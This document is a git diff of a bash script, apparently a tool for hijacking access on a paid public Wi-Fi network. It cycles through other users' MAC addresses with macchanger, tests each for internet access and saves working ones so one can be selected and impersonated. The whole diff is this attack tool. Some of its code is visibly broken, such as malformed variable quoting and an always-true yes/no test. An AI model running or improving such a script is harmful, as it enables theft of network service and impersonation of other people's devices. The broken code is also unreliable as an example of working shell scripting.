@@ -27,6 +27,7 @@ echo "
 	[1] Scan users with internet [◉]
 	[2] Select user from [online.txt] [◉]
 	[work in progress -- connect to public pay network then run script] [◉]
+		[increase sleep time / tries and counts to improve accuracy]
 		
 ..............................................................................
 "
@@ -38,12 +39,13 @@ read action_1
 #echo "Enter the wifi name to exploit"
 #read wifiname_1
 #wifiname_1= read -r
-#if [[ -d /tmp/freep ]];then
-#	rm -rf /tmp/freep
-#else
-	#mkdir /tmp/freep
-#	echo ""
-#fi
+if [[ -d /tmp/freep ]];then
+	rm -rf /tmp/freep
+	mkdir /tmp/freep
+else
+	mkdir /tmp/freep
+	echo ""
+fi
 
 select_point(){
 	if [[ -f /tmp/freep/online.txt ]]; then
@@ -67,7 +69,7 @@ kill_wifi(){
 wake_wifi(){
 	#debug_command echo "turning on"
 	nmcli radio wifi on
-	#sleep 10
+	sleep 3
 }
 
 if [[ "$action_1" -eq 1 ]]; then
@@ -80,6 +82,7 @@ if [[ "$action_1" -eq 1 ]]; then
 	do
 		kill_wifi
 		sudo macchanger --mac=${user} $interface &>/dev/null
+		#sudo macchanger --show $interface
 		wake_wifi
 		echo " Checking internet connectivity on $user"
 		nmcli dev wifi connect $"{wifiname_1"} ${interface} &>/dev/null
@@ -87,16 +90,15 @@ if [[ "$action_1" -eq 1 ]]; then
 		#ping -c3 google.com
 		wget -q --tries=10 --timeout=10 --spider https://google.com
 		if [[ "$?" -eq "0" ]]; then
-			echo "[✔] ${Red}Internet available${reset}"
+			echo -e "[✔] ${Red}Internet available${reset}"
 			echo "$user" >> /tmp/freep/online.txt
 		else
-			echo "[◉] ${Yellow}No internet connection${reset}"
+			echo -e "[◉] ${Yellow}No internet connection${reset}"
 		fi
 	done < "$input"
 	echo "Continue with part 2 of the script and select an online point [y/n] "
 	read part2
 	if [[ $part2 -eq y || yes || Y || Y ]]; then
-		echo "This part executed"
 		select_point
 	else
 		echo ""
